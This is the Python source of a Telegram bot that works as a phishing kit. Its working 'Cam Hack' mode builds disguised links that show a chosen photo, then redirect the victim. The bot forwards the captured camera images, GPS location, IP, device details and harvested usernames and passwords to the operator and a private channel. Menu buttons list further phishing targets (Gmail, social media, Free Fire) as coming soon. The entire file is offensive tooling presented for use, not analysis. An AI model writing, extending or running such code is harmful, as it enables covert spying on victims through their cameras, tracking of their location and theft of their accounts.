import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
import threading
import requests
from config import *

bot = telebot.TeleBot(BOT_TOKEN)

# In-memory storage
user_data = {}
link_cache = {}
victim_photos = {}  # Store photo URL for each victim

# ========== BOTTOM BUTTONS ==========
def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = KeyboardButton("📸 Cam Hack")
    btn2 = KeyboardButton("📱 Social Media")
    btn3 = KeyboardButton("📧 Gmail")
    btn4 = KeyboardButton("🎮 Free Fire")
    btn5 = KeyboardButton("🔗 All Links")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    return markup

# ========== LINK GENERATE ==========
def generate_phishing_link(user_id, target_type):
    if not BASE_URL:
        return "❌ BASE_URL missing! Set it in Render env."
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"
    link_cache[unique_id] = {"user_id": user_id, "type": target_type, "time": time.time()}
    return link

# ========== /START ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n"
        "📸 Cam Hack (working)\n"
        "📱 Social Media (coming soon)\n"
        "📧 Gmail (coming soon)\n"
        "🎮 Free Fire (coming soon)\n"
        "🔗 All Links (coming soon)",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== BOTTOM BUTTONS HANDLER ==========
@bot.message_handler(func=lambda message: True)
def handle_bottom_buttons(message):
    user_id = message.from_user.id
    text = message.text

    if text == "📸 Cam Hack":
        msg = bot.send_message(
            user_id,
            "📤 Send me a PHOTO (will be shown to victim)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(msg, get_cam_photo, user_id)

    elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
        bot.send_message(
            user_id,
            f"⏳ *{text}* is coming soon. Only *Cam Hack* is working right now.",
            reply_markup=get_bottom_buttons(),
            parse_mode="Markdown"
        )

    else:
        bot.send_message(
            user_id,
            "❌ Use the buttons below.",
            reply_markup=get_bottom_buttons()
        )

# ========== CAM HACK: PHOTO ==========
def get_cam_photo(message, user_id):
    if message.photo:
        photo_id = message.photo[-1].file_id
        # Get file URL from Telegram
        file_info = bot.get_file(photo_id)
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["photo_id"] = photo_id
        user_data[user_id]["photo_url"] = file_url
        
        # Store photo for victim page
        victim_photos[str(user_id)] = file_url
        
        bot.send_message(
            user_id,
            "📤 Now send the REDIRECT LINK (URL where victim will go after photo capture)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(message, get_cam_redirect, user_id)
    else:
        bot.send_message(
            user_id,
            "❌ Send a PHOTO first.",
            reply_markup=get_bottom_buttons()
        )

# ========== CAM HACK: REDIRECT ==========
def get_cam_redirect(message, user_id):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        link = generate_phishing_link(user_id, "cam")
        if "❌" in link:
            bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
            return
        
        # Store redirect in server
        try:
            requests.post(f"{BASE_URL}/set_redirect/{user_id}", json={"url": redirect_url}, timeout=5)
        except:
            pass
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim will see your photo & redirect to `{redirect_url}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(
            user_id,
            "❌ Valid URL starting with http:// or https://",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(message, get_cam_redirect, user_id)

# ========== INLINE CALLBACKS ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    data = call.data
    if data == "copy":
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")

# ========== FORWARD DATA TO USER + CHANNEL ==========
def forward_to_user_and_channel(user_id, data):
    try:
        # Message for user
        user_text = f"📥 *Victim Data Received*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
        device = data.get('device_info', {})
        if device:
            user_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            user_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        creds = data.get('creds')
        if creds:
            user_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"

        bot.send_message(user_id, user_text, parse_mode="Markdown")

        # Send photo to user
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp.jpg', 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                with open('temp.jpg', 'rb') as f:
                    bot.send_photo(user_id, f)
                os.remove('temp.jpg')
            except:
                pass

        # Send location to user
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(user_id, loc['lat'], loc['lng'])

        # Forward to channel
        channel_text = f"📥 *New Victim Data*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
        if device:
            channel_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            channel_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        channel_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        if creds:
            channel_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"

        bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")

        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp2.jpg', 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                with open('temp2.jpg', 'rb') as f:
                    bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('temp2.jpg')
            except:
                pass

        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])

    except Exception as e:
        print(f"Forward error: {e}")

# ========== AUTO-DELETE LINK CACHE ==========
def clean_old_links():
    while True:
        time.sleep(600)
        current_time = time.time()
        to_delete = []
        for key, val in link_cache.items():
            if current_time - val["time"] > 600:
                to_delete.append(key)
        for key in to_delete:
            del link_cache[key]
        print(f"🧹 Deleted {len(to_delete)} old links")

threading.Thread(target=clean_old_links, daemon=True).start()

# ========== RUN ==========
if __name__ == "__main__":
    print("🤖 Bot is running... Cam Hack is working.")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
